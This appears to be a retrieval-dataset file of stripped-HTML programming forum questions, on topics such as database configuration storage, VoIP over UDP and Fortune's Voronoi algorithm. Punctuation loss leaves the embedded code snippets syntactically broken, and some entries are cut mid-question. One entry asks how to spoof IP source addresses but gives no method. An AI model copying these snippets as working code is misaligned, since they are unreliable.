Negative 990 pWhat is peoples prefered method of storing application configuration data in a database. From having done this in the past myself, Ive utilised two ways of doing it.p  ol liYou can create a table where you store keyvalue pairs, where key is the name of the config option and value is its value. Pros of this is adding new values is easy and you can use the same routines to setget data. Downsides are you have untyped data as the value.li liAlternatively, you can hardcode a configuration table, with each column being the name of the value and its datatype. The downside to this is more maintenance setting up new values, but it allows you to have typed data.li ol  pHaving used both, my preferences lie with the first option as its quicker to set things up, however its also riskier and can reduce performance slightly when looking up data. Does anyone have any alternative methodsp  pstrongUpdatestrongp  pIts necessary to store the information in a database because as noted below, there may be multiple instances of the program that require configuring the same way, as well as stored procedures potentially using the same values.p

It will then also have a polymorphic relationship out to a table specific to the type of data the implementing class wraps.

Negative 990 blockquote   pemDead reckoningem is the process of estimating ones current position based upon a previously determined position and advancing that position based upon known or estimated speeds over elapsed time, and course. a hrefhttpen.wikipedia.orgwikiDead5Freckoning relnofollowWikipediaap blockquote  pIm currently implementing a simple server that makes use of dead reckoning optimization, which minimizes the updates required by making logical assumptions on both the clients and the server.p  pThe objects controlled by users can be said to be turning, or not turning. This presents an issue with dead reckoning the way I see it.p  pFor example, say you have point emAem in time defined by [position, velocity, turning leftrightno]. Now you want point emBem after emtem amount of time. When not turning, the new position is easy to extrapolate. The resulting direction is also easy to extrapolate. But what about when these two factors are combined The direction of the velocity will be changing along a curve as the object is turning over emtem amount of time.p  pShould I perhaps go with another solution such as making the client send an update for every new direction rather than just telling the server Im turning left nowp  pThis is in a 2D space, by the way, for the sake of simplicity.p

Negative 990 pIm using Prototype in my Rails project to do inplace editing via Ajax.InPlaceEditor of a form. However, I dont want it to immediately post back and do the update  the form itself is pretty complicated and the user may decide to abandon their changes. Only now they cant, because the form has invisibly to them updated the database.p  pSo, what I was thinking of doing was using Prototype InPlaceEditor without specifying a postback url or make it a generic postback url that returns true and then as part of the onLeaveEditMode for the field, have it update a hidden form field with the new value.p  pThat way, when the user gets the fancy look and feel of an inplace editor but still can press Cancel at the bottom and undo all the changes.p  pSo, Ive embarked on this mission in a little test prototype and it seems to work  except it means a substantial amount of javascript code and, in a way, feels like bastardizing the InPlaceEditor purpose. This has to be a solved problem but my googlefu doesnt return anything quite like I want.p  pSomething kind of like this but obviously not a grid form where you can inplace edit the fields but must press save to commit your changes a hrefhttpwww.nitobi.comproductsgrideditors relnofollowhttpwww.nitobi.comproductsgrideditorsap  pCouple of questions 1 Is there an existing rails plugin or Prototype class to do this for me 2 If not, does my approach sound reasonablep  pThanksp

Itll be done for me.p  pI do have a restful webservice in the solution already, but im wary about calling it from my webapp. Id rather all the code live within my webapp, not depend on a web service which will be in a different app pool on the same iis server.  It may need to be coldstarted etc, and i need this to be quick.p  pIve added a wcf file to my webapp using the template AJAXenabled WCF Service.  But then by doing this, im muddying up my webapp with endpoints in the web.config etc.  and im currently getting 500 System.ServiceModel.ServiceActivationException exceptionsp  pSo, down to my question.... Whats the best way to call my function  Im thinking it has to be my restful webservice Is there another option that im not consideringp  pThanks muchly.p

Maybe you have some experience. The project im working on have many very special requirements so I need something that will be very extensible eg. add new payments types, new promotions, add functionality to have custom view for every category and by custom view i dont mind different category name color only. But for me easy extensible means not only well written code but also well documented with good support. As you see this doesnt have to be freeopensource but licence have to allow to modify source code. It also cannot be very expensive less than 5000. Also it has to be fast. It must support few thousand ordersper day. I dont care if output is based on divs, tables or HTML5 sectionsrticle. We gonna rewrite it anyway, but build in seo support meta tags, urls for categoryproduct is must. It also should allow to have unlimited category depth. It will be nice to have built in CMS but I am not interested in cart extension to jomladrupal. It have to be standalone ecommerce application.p  pIm not interested in javapython because there is lack of developers so only PHP solutions are taken into consideration.p  pWhy not Magento it looks good ad have awesome admin panel, but i heard that it is very slow.

Zencart is based on oscommerce and i suppose that not many things changed.p  pOthers from my list looks the same. I cant see bi difference in functionality.

Negative 990 pI have a WPF application which is displaying field validation messages by implementing the IDataErrorInfo interface. This is all working well.p  pWhat I want to do now is to break out the validation messages into an separate xml file so that validation message key value pairs can be stored outside of the code and can be easily maintained possibly by an end superuser.p  pI was thinking of having a method something likep  precode    private void ValidateRequiredFieldltTgtref T field, string fieldName              string error  null         if Equalsfield, null              field is string                 ampamp string.IsNullOrEmptyfield.ToString                      field.ToString.Replace , string.Empty.Length  0                              field is int                 ampamp int.Parsefield.ToString  0                                   error  GetValueFromConfigfieldName                  SetFieldDataErrorfieldName, error      codepre  pIs the best way to store these key value pairs in an xml file I seem to remember that there used to be a Microsoft Configuration Application Block but I cant see an equivalent in Enterprise Library 5.0.

Negative 990 pI just read a hrefhttpbenalman.com relnofollowBen Almanas article on a hrefhttpbenalman.comnews201011immediatelyinvokedfunctionexpression relnofollowImmediatelyInvoked Function Expressionsa and wondered about this part, where hes introducing function expressions and closures not really related to IIFEs yetp  blockquote precode ...doesnt it stand to reason that the function expression itself can  be invoked, just by putting  after it  function  code goes here     This works Well, almost. A minor JavaScript syntax issue actually  requires that ambiguity between function declarations and function  expressions be eliminated, which can be done by wrapping the function  expression in parens.   The following pattern is used universally to create an anonymous  closure with privacy  function  code goes here     This parens syntax is also valid I prefer the previous version  function  code goes here   codepre blockquote  pThat last part struck me. Can anybody explain why there are two different syntactical versions for invoking function expressionsp  pWas this syntax consciously introduced just for invoking anonymous closures Or is it a byproduct of some other syntactical propertyp  pWhy does the second version work anyway The first one makes sense to me from a parser standpoint. The first pair of parens evaluates to a function object, the second pair invokes this function object. But the second one It doesnt look like its resolving the mentioned syntactical ambiguity.p  pCan anybody tell me what Im missing herep

Negative 990 pLots of questions, I am sorryp  pI am doing a voicechat VoIP application and I was thinking of doing a custom implementation of the IPampUDP headers, along with small, extra information mainly seq number. Sounds alot like RTP yes, but Im mainly just interested in the seq number or timestamp, and trying to implement my own whole RTP sounds like a nightmare with all the complexity involved and data im not likely to use.p  pTarget OS for the application is windows xp and above. I have read a hrefhttpmsdn.microsoft.comenuslibraryms74054828vvs.8529.aspx relnofollowhttpmsdn.microsoft.comenuslibraryms74054828vvs.8529.aspxa on the topic of Raw sockets in windows, and now I just want some confirmation. I also have some general networking questions.p  pHeres the following questionsp  p1 According to MSDN, you cannot send custom IP packets with a source that is not on the network list. I understand it from a security PoV, but is there any way around this My idea was to have for example two clients open UDP communication to a nonNAT protected server, and then have the clients spoof the sourceheader to make it look like packets come from the server instead of each other, thereby eliminating the need for a server as a relay of data to get through NAT, which would improve latency.  I have heard of winpcap but I dont want each client to have to install any 3rd party apps. Considering the number of DoS attacks surely there must be some way around this, like spoofing the network table the OS uses to check if sourceheader is legit Will this trigger antivirus systems I feel it would be really fun to actually toy with IP headers and above instead of just using predefined headers.p  p2 Ive been having issues with free RTP libraries like JRTPLIBwhich probably is very good anyway it just dosnt want to work for me to make them work, more than I could almost tolerate, and am thinking of just writing my own interpretation ontop of UDP. Does applicationlevel protcols like RTP simply build their header directly inside the UDP payload with the actual data afterwards I suspect this considering the encapsulation process but just want to make sure.  If so, one does not need to create a RAW socket to implement applicationlevel protocol, just an ordinary UDP socket and then your own payload interpretation abovep  p3 RTP does not give any performance boost compared to UDP since it adds more headers, all it does is making sure packets arrive in a sortof correct manner based on timestamps and sequence numbers, right  Is it really that usefull to use an RTP implementation for your basic VoIP project needs instead of adding basic sequencing yourself I realise for video conferencing perhaps you reaally dont want frames to play out of order, but in audio conversations, would you really notice itp  p4 If my solution in 1 is not applicable and I would have to use a server as a data relay between clients, would multicast be a good solution to reduce server loads Is multicast supported enough in routing hardware p  p5 It is related to question 1. Why do routersfirewalls allow things like UDP hole punching For example, two clients first conenct to the server, then the server gives a client port  ip on to other clients, so the clients can talk to each other on those ports. Why would firewalls allow data to be received from another IP than the one used in making the connection on that very port Sounds like a big security hole that should easly be filtered I understand that source IP spoofing would trick it, but thisp  p6 To set up a UDP session between two parties the client which is behind NAT, server whic his nonNAT does the client simply have to send a packet to the server and then the session is allowed through the firewall Meaning the client can receive too from the server. Based on article at wiki, a hrefhttpen.wikipedia.orgwikiUDPholepunching relnofollowhttpen.wikipedia.orgwikiUDPholepunchingap  p7 Is SIP dependant on RTP For some reason I got this impression but I cant find data to back it up. I may plan to add softphone functionality to my VoIP client in the future and want to make sure I have a good foundation RTP if I really must, otherwise my own UDP interpretationp  pThanks in advancep

Negative 990 pI am currently coding a memory allocation system for a game engine, and I was wondering if there were any experienced developers out there who could help with some advice about what allocator structures are useful.p  pI know that sounds a bit worrying to some people, and so I think I need to justify my position a little bit. I have read the answers a hrefhttpstackoverflow.comquestions1987043gameenginedevelopmentherea and a hrefhttpstackoverflow.comquestions3411551gameenginedevelopmentherea and also the blogs they point to a hrefhttpstackoverflow.comquestions1987043gameenginedevelopmentherea, a hrefhttprealtimecollisiondetection.netblogp44 relnofollowherea and a hrefhttprealtimecollisiondetection.netblogp81 relnofollowherea. But see, I have tried the make a game first, over and over, and then the code you reuse is your engine thing, and it didnt really work for me. I found that I actually got bogged down in those things I was doing again and again probably didnt reuse my code very well and didnt get very far in any game.p  pSo, I decided I would code these things that I was reusing over and over again once more... do it once and set it aside.p  pI really found myself out of my league, so I bought a few books. Game Engine Architecture by Jason Gregory GEA is really good, btw, but I also have Game Coding Complete McShaffry and Programming Game AI by Example Buckland. GEA has some really good ideas about high performance allocators, and that really interested me, so I thought I would give it a go.p  pI have coded a stackbased allocator, and am nearly finished a poolbased allocator. Both have the capacity to be memory aligned and can be assigned to work with different memory budgets i.e. any allocator could for example use retail memory or development memory etc. I have found just creating these components such a rewarding thing in terms of my programming skillsinterest level.p  pI am wondering if there are any developers out there who would be willing to recommend any other allocator structures that are useful or come up regularly in game development.  Or if there are any developers who have never used anything else in their entire careersp  pAgain justifying my question I can nearly hear people whispering Just make your own game and see what structures you need..., but... Game Engine Architecture has been such a great resource for me because the author is willing and unashamed to say hey, this is what the industry mostly sorta does.

Negative 990 pI am reviewing a part of code using php mcrypt library to encrypt some binary data using the Blowfish cipher.

They are not used elsewhere besides the returned tempArray which is put into the large array. This is repeated. The memory used just keeps growing and growing.

Negative 990 pDoes anyone know of a browser plugin or application that will save form values then populate the same form when requiredp  pLet me explain what I mean. Im currently working on the registration page of a web application. As you can imagine its quite long and I have to keep filling it out. I can fill it out reasonably quickly using values already entered by tabbing through the fields and hitting the down arrow. But, its not fast enough Ideally Id like to enter the form values, then somehow save all the values under a name. E.g. Valid registration. When I come back to the page Id like to select my saved Valid registration form values and have the whole form populated automatically.p  pIve tried things like a hrefhttpsaddons.mozilla.orgenUSfirefoxaddonwebdeveloper relnofollowWeb Developera but they are no good, they dont populate a form with valid data.p  pEDITp  pIve also looked at a hrefhttpsaddons.mozilla.orgenUSfirefoxaddonautofillforms relnofollowautofill formsa which is better, but still requires a lot of set up for a long form containing non standard fields.p

And the second log doesnt even appear. I assume its because the name method isnt getting called. But I dont know why. I should specify that they are in separate classes and I declared the name method like thisp  precode NSStringname codepre  pEDIT After a bit more fooling around I found that when the name method gets called from its own class, the log correctly shows whatever was in the text field. I put an extra log inside the name method, and I can see that it emisem getting called from the other class, but the value its returning is still null which means something is happening after the call that is preventing the class from getting the text field string.p  pEDIT Im not sure if this is important but one of the classes is a subclass of NSObject, the other is a subclass of NSViewController.p  pLet me know if you need any more information. Thanks for the help.p

Negative 990 pI have a server application and a client application in order to send and receive files between computers. p  h2you may skip this parth2  precodeMy algorithm is as follows  server  start listening for connections  client establish a connection with the server  server start a thread where that thread consist of a method listening for data send through the network stream  client also start listening for data on a while loop runing on a separate thread.   so far if the client sends a byte array through the connection netwrok stream the server will receive it.   also in each while lop the client and server there is a switch statement. if data received commes with the string ltfilegt then it will start listening for the transfer of a file   client send the string ltfilegt to the server and start listening for that file on a different method.  server because it receives the ltfilegt keword it exits the listening loop and sends ltokgt reply  .... so the talking between server and client keeps going ...........   also the server is running yet more other threads such as still listening for new connections. maybe another client wants to connect to it. so every time  a client connects the server, the server will start doing the same process  again on a separate thread listening for new connections.  codepre  hr  pSo as you can see everything that gets sent through the network stream gets received by the other application.p  h2 So everything works great when a connection is establishedh2  pNow think about the things that have to happen in order to establish a connection from computer A that happens to be in a house and Computer B happens to be on a office on a different network. Note computer A and computer B have internet access.  so lets say you want your computer A to be the server and computer B to be the client. So you will have to start the server. great the server is now running. Then you will start the client application. You will also have to tell the router in the house to forward all traffic from port X to that server computer so that computer B is able to find it. Once you do that computer B is able to establish a connection. If next day you have a different IP address because most of us we dont have static IP you will have to change that IP on the client computer in order to establish a connection. so it can get quite complicated and not friendly. Also you may want your office computer to be the server because it might always be on but maybe you dont have access to the router so you are screwed. p  h2Solutionsh2  p1p  precodeon my house call my internet service providers and pay to get a static IP.  I have not developed an algorithm but basically now computer A and computer  B will be clients and they will be connected to my computer at my house.  on my house I will have to configure the router obviously to do port forwarding. so know if computer A wants to send a file to computer B the server at my house  needs to have those to connections. the connection between computer A and the  connection through computer B. If something gets sent to the server at my  house from computer A then sent that to computer B and vice versa.   problems with this solution is The upload speed at my house is very slow therefore the transferring of files will be slow. also I dont know if my network at my  house will be able to manage multiple connections.  codepre  p2p  precodestep 1 Host a website from my home still getting a static ip address. this time I also  have to get a domain so that users can remember me. so lets say that I am able to host this website hosted on my house as somedomain.com  . soon you understand  the purpose of the website....  step 2 I dont know that much about this it is called UDP punch hole into firewall.  this basically tells the router to port forward all traffic from port x to the  server so that users dont have to open ports on their routers. I DO NOT KNOW  HOW TO DEVELOP THIS I HAVE JUST HEARD ABOUT IT. so if I develop this computer  A will be able to connect to computer B without having to do any configuration  on the router which is nice.  step 3 lets say that computer B is the server and computer A is the client that wants  to connect to computer B. so computer B will talk to my website at my house and  tell it that it is listening for connections on the ip address xxx.xxx.xxx.xxx .  then the client computer will access the website at my house and see the ip address  of computer B. now the connection is going to be able to be established.    step 4 If the internet IP address of computer B changes for example. then let my website  know the new IP address. next time the client wants to connect to the server it  will be able to find the correct IP by looking into my website.  problems with this technique I do not know how to implement UDP punch hole into firewall so that users do not have to do any configurations  on their routers. an example of this will be helpful. codepre  p3 p  precodethere are a lot of companies out there that can host you a website. I dont know  about a company that will let me run a c console application on their server.  Also I dont know if the file transfer of data going from computer A to a server  then to Computer B is more efficient than data going from computer A to computer B.  This solution will enable me to stop thinking about users having to configure their  routers which is nice.  codepre  pThis application enables you to do many more things. I know there are several applications that will enable me to just transfer files. It will be nice if someone will point me on the right direction of which technique to use. p

Negative 990 pI believe we cannot bind to internal viewmodel.p  pTherefore I think all binding related implementations of IValueConverter, IMultiValueConverter, INotifyPropertyChanged, INotifyCollectionChanged should be always public in order to work with XAML.p  pIs that correctp  pstrongUPDATEstrong this isnt such an easy question because there are various possible weird cases, like nested viewmodel classes, or explicit interface implementations or something else that I am not aware of which could possibly lead to different answers. As we already can see WPF and SL4.0 treat internal viewmodels differently for some reason.p
Negative 990 pIs there some interface that will allow for iteraction of arrays and java.util.Listsp  pSeeing as how the foreach loop can iterate both it seems to me there must be some sort of base iterable that is being traversed in both cases.p  pSo, can i setup a method parameter that accepts either Foo[], or Listp  pWe have lots of old code which we wont be updating, that calls a few low level methods which id like to update that are expecting arrays.p  pOur new code is converting from Lists specifically ArrayLists most of the time to arrays using Lists toArray method, and id like to be able to skip this step.p  pIve seen a hrefhttpstackoverflow.comquestions85190howdoesthejavaforeachloopworkthisa post which shows the implementation, but Im not sure how it might help.p  pCan this be donep

Negative 990 pA coworker and I were talking after a fashion about an a hrefhttpsthreatpost.comenusblogshtcandroidphonesleakprivateuserdata100311 relnofollowarticle I read HTC permission security riska. Basically, the argument came down to whether or not it was possible to log ievery actioni that an application was doing. Then someone an abstract theroetical person would go through and see if the app was doing what it was supposed to do and not trying to be all malicious like.p  pI have been programming in Android for a year now, and as far as I know if  ibifbi  that was possible, you would have to hack Dalvik and output what each process was doing. Even if you were to do that, I think it would be completely indecipherable because of the sheer amount of stuff each process was doing.p  pCan I get some input one way or the other Is it completely impractical to even attempt to log what a foriegn application is doingp
Negative 990 pWe have written the system to analyse log messages from the large network. The system takes log messages from lots of different network elements, and analyses it by regex expressions. For example user may have written two rulesp  precodecronscript.sh. .script.sh [09] codepre  pIn this case only logs that match given patterns will be selected. The reason of the filtering is that there may be really lots of log messages, up to 1 GB per day.p  pNow the main part of my question. Since there is lots of network elements, and several types of them, and every one of them has different parameters in path... Is there any way to automatically generate set of regexes that will somehow group the logs The system can learn on historical data, e.g. from the last week. Generated regex must not be very accurate, it is supposed to be the hint for user to add such new rule into system.p  pI was thinking about unsupervised machine learning to divide input into groups and then in each group find proper regex. Is there any other way, maybe faster or better And, last but not least, emhow toem find regex that matches all strings in obtained group  Nontrivial, so code.code is not the answer.p  hr  pstrongEditstrong After some thinking Ill try to simplify the problem. Suppose I have already grouped logs. Id like to find at most three largest substrings at least one common to all the strings in set. For examplep  precodeSet of strings cronscript1.sh abc 1243 all cronscript2.sh 1 binscript1.sh asdf 15  Obtained groups script .sh  codepre  pNow I can build some simple regex by concatenating these groups with code.code. In this example it would be code.script..sh .code. It seems to be simpler solution.p

Negative 990 pI was given a question some time ago that I am not sure of how to answer, the question is typed below can anyone give me an idea of how i should go about doing this using Cp  pwrite code to help synchronize a professor and hisher students during office hours. The professor, of course, wants to take a nap if no students are around to ask questions if there are students who want to ask questions, they must synchronize with each other and with the professor so that only one person is speaking at any one time, each student question is answered by the professor, and no student asks another question before the professor is done answering the previous one. You are to write four proceduresAnswerStart, AnswerDone, QuestionStart, andQuestionDone. The professor loops running the code AnswerStart give answer AnswerDone. AnswerStart doesnt return until a question has been asked. Each student loops running the code QuestionStart ask question QuestionDone. QuestionStart does not return until it is the students turn to ask a question. Since professors consider it rude for a student not to wait for an answer, QuestionEnd should not return until the professor has finished answering the question.p

Negative 990 pI am working with achartengine in my app.  They have added a feature to handle null values but in order to handle them properly you need MathHelper.NULLVALUE to be in the place of a null value.  The graph needs a List Double[] list of double arrays in order to properly display the data.  My code loops through a cursor, populates a list of doubles, converts the list of doubles into a Double[] then finally adds the Double[] to my List Double[].  p  pI tried putting an ifelse statement in the loop saying if columnTEMP is null then cvalueMathHelper.NULLVALUE but it does the calculations before it is needed and the results were quite catastrophic it failed.  The graph did not populate properly having a single small line on the very bottom of the screen and only showed 2 points instead of 10.  It cannot do the calculations for MathHelper.NULLVALUE until after it is in the List Double[].  I am trying to figure out a way to change null values when it goes from Double[] to List Double[].  Here is the code I am currently using.  Asis it makes null values show as 0 on the graph.  Graphs using larger numbers can be quite messed up if one null value is there.  You could go from several hundred all the way across to 0 out of nowhere then back to several hundred again.

Negative 990 pI am implementing Fortunes sweepline algorithm for computing Voronoi diagrams. My primary reference is Computational Geometry Algorithms and Applications by de Berg et al., and while their coverage of the topic is very clear, they pass over several small but important details that I have been having trouble working out myself. Ive searched the web for help, but other websites either give an even higher overview than the textbook, or give the exact same pseudocode provided by the book.p  pI need a way to determine whether a pair of breakpoints determined by a triple of arcs on the beach line converges or diverges, in order to detect upcoming circle events. It seems that to make a decision I would need knowledge about the shape of the Voronoi cell edges that the breakpoints trace out as Fortunes algorithm progresses. For example, if I could find the slope of the edge traced by a breakpoint I could calculate where the two lines formed by the breakpoints and their respective slopes intersect, and decide whether they converge based on that result. However, I have no idea how to get information on the slopes, only the current position of the breakpoints.p  pThe only information I have to work with is the x,y location of the three sites and the current ycoordinate of the sweepline Im using a horizontal sweepline.p  pActually, I do have one idea for determining convergence. Given two sites, the breakpoint between the two sections of the beachline they define is governed only by the current position of the sweep line. I thought about recording the position of the two breakpoints, temporarily advancing the sweep line a small amount, and recording their new positions. Because edges in a normal Voronoi diagram do not curve, if the distance between the new pair of breakpoints is less than the distance between the old pair, then the breakpoints converge otherwise, they diverge. But this seems both dangerous I have no idea if it always works and ugly. Surely there must be a better way.p  pAny ideas would be appreciated, and pseudocode in a Clike syntax if possible especially so. Also I am aware that there are computational geometry libraries that I could use to get Voronoi diagrams, but this is a personal learning exercise, so I want to implement all parts of the algorithm myself.p

Negative 990 pI recently discoverd some evil code in some of my clients websites. These snippets where PHPbased and JSbased and were injected because a trojanvirus logged some ftpcredentials.

This website does not contain any harmful data at least not today anymore, so I ask myself and you Why should someone link to a site in an invisible iframe and not doing some other evil things My first guess is, that there is a SEOAgency which promised a lot of traffic on their clients website bahnmotive.de and accomplished that because of this trojanvirus. Could that be I did a research in Google, but found nothing about this, so I wanted to ask some of the pros here. Perhaps you can point me to another forum where this topic can be discussed.p

Negative 990 pI am making a platform game in flash.p  pI have a goal classthe class which contains code for the goal sprite, where when you hit it, it continues to next part of game.p  pInside the goal constructor, 2 event listeners are added, they are as followsp  precodeaddEventListenerEvent.ADDED, beginClass addEventListenerEvent.ENTERFRAME, eFrame codepre  pThe beginClass function is fine, and only runs once, but eFrame is what checks if the player has hit the goal, so it is constantly running. The problem is, once the player hits the goal, eFrame continues to run, while in a menu describing the next scene to the player. My eFrame function is below.p  precode    private function eFrameeventEventvoid         ifhitTestObjectroot.mcMain             var lastScoreint  root.mainScore             root.mainScore  lastScore             while root.lvlHolder.numChildren gt 0                      root.lvlHolder.removeChildAt0                          root.mcMain.removeChildAt0             root.isInCut  true             if root.lvlCurrent  1                  root.gotoAndStop2              else if root.lvlCurrent  2                  root.gotoAndStop3              else if root.lvlCurrent  3                  root.gotoAndStop4                            codepre  pFrames 2, 3, 4, are frames with just text and a button that display a message to the player, and then the player hits continue. My problem is that eFrame is still trying to be run, but the class has not been instantiated, and the method is causing extreme amounts of lag once the player continues.p

Negative 990 pI am wondering if this is the best way to go about solving my problem. p  pI know the values for particular offsets of a binary file where the information I want is held...What I want to do is jump to the offsets and then read a certain amount of bytes, starting from that location.p  pAfter using google, I have come to the conclusion that my best bet is to use fseek to move to the position of the offset, and then to use fread to read an amount of bytes from that position.p  pAm I correct in thinking this And if so, how is best to go about doing so i.e. how to incorporate the two together.p  pIf I am not correct, what would you suggest I do insteadp  pMany thanks in advance for your help.p  pMattp  pemEditemp  pI followed a tutorial on fread and adjusted it to the followingp  precode    include ltstdio.hgt     int main            FILE f       char buffer[11]       if f  fopencommarray2.img, rt                freadbuffer, 1, 10, f         buffer[10]  0         fclosef         printffirst 10 characters of the filensn, buffer              return 0      codepre  pSo I used the file commarray2.img and read the first 10 characters from the file.p  pBut from what I understand of it, this goes from startoffile, I want to go from someplaceinfile offsetp  pIs this making more sensep  pEdit Number 2p  pIt appears that I was being a bit dim, and all that is needed it would seem from my attempt is to put the fseek before the fread that I have in the code above, and it seeks to that location and then reads from there.p
Negative 990 pI am compiling a program through clangllvm version 3.1 and trying to run it on a computer which also has the same clangllvm version. Im compiling on Ubuntu 10, but the other computer where Im trying to run has CentOS 5. There in CentOS, I also encounter problems compiling through LLVM a compiler pass is implemented in LLVM. That is why I thought about compiling on Ubuntu, take the exe from there and just run it on the CentOS machine.p  pHowever, when I try to do that, I get the following error.p  precode.main usrlib64libstdc.so.6 version GLIBCXX3.4.11 not found required by .main .main usrlib64libstdc.so.6 version GLIBCXX3.4.9 not found required by .main codepre  pHow can I solve this. Please note that I do not have root accesses on that machine.p

Negative 990 pHere you can find my emnemth question on Symfony2.p  pIm working with a a hrefhttpsgithub.commakerlabsPagerBundlewikipagination bundlea that uses the route name provided in the coderouting.ymlcode file. From my perspective, this approach is not flexible and lead to a dirty code, since if I change the name of the route, then I have to look at all the Twig templates or PHP files to update the route name. This is ok for small Web applications, but will provide such a bug for larger applications and also need an high burden for the developer.p  pSo, I was wondering to pass a string variable strongxstrong to the codePagercode object provided by the above mentioned bundle. The string strongxstrong should be initialized within the controller and has to provide the desired route name as given in the coderouting.ymlcode file.p  pLet me give an example. The routing file is the followingp  precoderouting.yml  AcmeTestBundlelistall pattern  testpagepage defaults  controller AcmeTestBundleListlistall, page 1  requirements     page  d    codepre  pThen the related controller isp  precodeuse something.... class ListController extends Controller     public function exampleActionpage        array  range1, 100     adapter  new ArrayAdapterarray     pager  new Pageradapter, arraypage gt page, limit gt 25      return arraypager gt pager       codepre  pThen, in the twig template, the codepagercode receives the route name that refer to the above bundlep  precode if pager.isPaginable      paginatepager, AcmeTestBundlelistall   endif   for item in pager.getResults     ltpgt item ltpgt  endfor  codepre  pAny idea of how to get the AcmeTestBundlelistall string value at runtime just inside the controllerp

Negative 990 pIve just started a new job and inherited a nightmare WebForms .net 4.0 project thats going wrong in lots of places. p  pIve got a user control that is storing a DataTable in ViewState. The code is referencing the columns throughout the code by index number which is making it totally unreadable. I know I can reference columns by name to make it more readable but Id prefer to break it out into a List. p  pThe previous developer is storing the list in ViewState because changes cant be persisted back to the database, we read in data, sales people can make modifications to pricing and then the information is then pushed into XML format to generate a sales order form in PDF. So we need a mechanism for storing temporarily.p  pIf I had the luxury of starting from scratch Id pull the data down in JSON and do it all client side but I dont have that luxury just yet.p  ol lipIts been a long, long time since I worked with DataTables and Im pretty sure its not good to be placing this in ViewState, am I correct What kind of load would it be placing on the ViewState were looking at 44 columns and normally around 25 rows. spli lipSecondly, if there a big difference between placing a List in ViewState as opposed to a  DataTable or are they both as bad as each other  in which case Im doing no harm from my current position to switch outpli lipThird question, updates to rows are automatically updated in the ViewState DataTable, would that be the same with a Listpli lipLast one, more probing for advice. Where would the best place to store this information preferably the List server side  would Session or Cache be betterpli ol

Since I put the libraries in a lib folder wich is in the same folder as the .jar, I need to set codeDjava.library.pathcode in both cases.p  pThe required libraries for Linux are   libgluegenrt.so libjogl.so libjoglawt.sop  pI found those here  a hrefhttpdownload.java.netmediajoglbuildsarchive relnofollowhttpdownload.java.netmediajoglbuildsarchiveap  pNow the exported jar runs fine on my Lunix 64 bits system and I am currently trying to find a Windows and a Mac system to test it out.p  pstrongIf anyone has a solution to access .so files that are inside the .jar file, this is still welcome.strongp

Negative 990 pI tried to make the title as specific as possible.

Ive come to realize killing the backgroundworker would be worthless because I still want to keep what results are left over after the query is canceled. Plus it wouldnt be able to check the canceled state until after the query.p  pstrongWhat Ive come up with so farstrongp  pIve been trying to conceptualize how to handle this efficiently without taking too big of a performance hit.p  pMy idea was to use a SqlDataReader to read the data from the query piece at a time so that I had a loop to check a flag I could set from the GUI via a button. The problem is as far as I know I cant use the Load method of a datatable and still be able to cancel the sqlcommand. If Im wrong please let me know because that would make cancelling slightly easier.p  pIn light of what I discovered I came to the realization I may only be able to cancel the sqlcommand midquery if I did something like the below pseudocodep  precodewhilereader.Read   check flag status  if it is set to kill fire off the kill thread   otherwise populate the datatable with what was read  codepre  pHowever, it would seem to me this would be highly ineffective and possibly costly. Is this the only way to kill a sqlcommand in progress that absolutely needs to be in a datatable Any help would be appreciatedp

Negative 990 pI am probably missing something here, but Ill try and explain what I want to achieve and then someone please tell me that I am doing it wrongwhich I am   and point me in the right directionp  pI am using JavaFX 2.0, but I think this problem would lend itself to Swing, or any UI framework.p  pI want to develope a simple splash screen for my application, when the splash screen starts, I want to have a message label that will be used to update a user on whats happening, in regards to configuring up the back end of the application.  My application start up has 2 steps, the first step uses Spring to initialise the Application Context, which in turn initialises the DB JPA 2.0Hibernateetc.  The second part of my application start up process will query the DB for the initial data which will be used to populate the UI.  Both these steps need to be complete before I can close the splash screen, and between each step I want to update the label in the splash screen to let a user know which stage is being done at that time.p  pI have broken this down into the following simple program which uses JavaFX and a button, when the button is pressed a new thread is created, that starts another class, which just performs some count to an abitary value, and then another another thread is created to simlate the second step of the start up process, But my issue is here that the second thread attempts to run before the first thread has finished, and as a result runs into a NPE.p  pBelow is a breakdown of some simple code that highlights this issuep  precodepublic class Test extends Application      private LongTester lt     public static void mainString[] args              launchargs           Override     public void startStage primaryStage              Button btn  new Button         final Label lblText  new LabelStarting          btn.setTextSay Hello World         btn.setOnActionnew EventHandlerltActionEventgt                      Override             public void handleActionEvent event                                              new Threadnew ConstructorRunnable.start                  lblText.setTextMore Loading                  new Threadnew MethodRunnable.start                  lblText.setTextFinished                                HBox root  new HBox         root.getChildren.addbtn          Scene scene  new Sceneroot, 300, 250          primaryStage.setTitleHello World         primaryStage.setScenescene         primaryStage.show           private class ConstructorRunnable implements Runnable              Override         public void run                      lt  new LongTester                    private class MethodRunnable implements Runnable              Override         public void run                      lt.countAgain                    private class LongTester              public LongTester                      for int idx  0 idx lt 1000000 idx                              System.out.printlnConstructor   idx                                public Boolean countAgain                      for int idx  0 idx lt 1000000 idx                              System.out.printlnMethod   idx                          return Boolean.TRUE                 codepre  pCan anyone point out my mistakep

Well it doesnt help.p  precodeapplyProjectStateZipCountry      background E3E2AA     width 90   applyProjectstate      float left     background A4DEA8         width 40   applyProjectmailcode      float left     background EDABED         width 20   applyProjectcountry      float left     background B8E3AA         width 20  codepre  pSo the issue is that when I add the final float left in applyProjectcountry it causes State, mailcode and country to jump out of the purple div.p  pWhat am I doing wrong  Is there some limit to div and float lefts within those divs  Ive been searching around but must float tutorials seem oriented towards floating text around an image.p  pAny help would be much appreciated.p

Negative 990 pIm trying to implement a simple serializationdeserialization method for my code to be able to pass an object over the network using MPI. In an ideal world I would have used codeBoost.Serializationcode and codeBoost.MPIcode for that but they are not installed on some of the clusters I have access to so Im considering doing this myself.p  pMy strategy is to serialize every object into a codestdstringstreamcode object and then send a message via codeMPISendcode using codeMPICHARcode as the datatype. In such a case I would pass codestdstringstreamstrcstrcode as the pointer and codestdstreaingstreamstrsizesizeofcharcode as the size of the message.p  pIve figured how to serialize everything into a codestdstringstreamcode object. My deserialization method also takes a codestdstringstreamcode object and deserializes everything back. This works fine except I do not know how to create a codestdstringstreamcode object from an array of codecharcodes and avoid the extra copy from the array into the stream. Should I change my deserialization method to directly work with an array of codecharcode using codememcpycode insteadp

Negative 990 pI am working in a project where we develop some webservices. I was new to the technology, so I didnt really question about some ways of doing.

